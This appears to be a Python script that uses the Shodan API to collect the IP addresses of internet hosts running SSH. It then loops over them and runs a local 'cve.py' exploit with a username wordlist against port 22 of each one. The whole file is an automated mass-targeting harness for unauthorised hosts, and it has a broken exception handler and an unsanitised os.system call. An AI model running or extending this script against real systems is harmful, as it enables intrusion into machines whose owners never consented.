import os
import shodan

SHODAN_API_KEY = "COMPLETE_HERE" #Add you API key there

api = shodan.Shodan(SHODAN_API_KEY)

try:
	with open('ips.txt', 'w') as f:
		results = api.search('ssh')
		print('Results found: {}'.format(results['total']))
		for result in results['matches']:
			f.write(result['ip_str'])
			f.write("\n")
			print('IP: {}'.format(result['ip_str']))
			
except shodan.APIError:
	print('Erreurr: {}'.format(e))

with open('ips.txt') as f: 
	for ip in f:
		print("IP "+ip[0:len(ip)-1]+" -------")
		os.system("./cve.py "+ip[0:len(ip)-1]+" --port 22 -w users.txt")
